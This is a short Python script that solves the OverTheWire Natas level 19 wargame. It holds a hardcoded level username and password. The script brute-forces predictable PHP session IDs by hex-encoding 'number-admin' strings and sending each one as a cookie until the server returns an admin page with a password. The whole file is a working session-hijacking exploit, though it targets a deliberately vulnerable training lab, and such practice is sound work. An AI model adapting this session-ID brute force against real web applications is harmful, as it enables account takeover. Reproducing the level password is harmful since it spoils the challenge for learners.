#!/usr/bin/env python
# encoding: utf-8

import time
import requests

"""
'sessid-username'.encode('hex')
"""


NATAS_USER='natas19'
NATAS_PASS='4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
NATAS_URL='http://natas19.natas.labs.overthewire.org/index.php'

if __name__ == '__main__':
    for i in range(640, 0, -1):
        print "PHPSESSID: %s" % (i)
        id = "%s-admin" % (i)
        id = id.encode('hex')
        cookies = {'PHPSESSID': id}
        auth = (NATAS_USER, NATAS_PASS)
        r = requests.get(NATAS_URL, auth=auth, cookies=cookies)
        if r.text.find('Password:') != -1:
            print r.text
            break
        time.sleep(0.1)

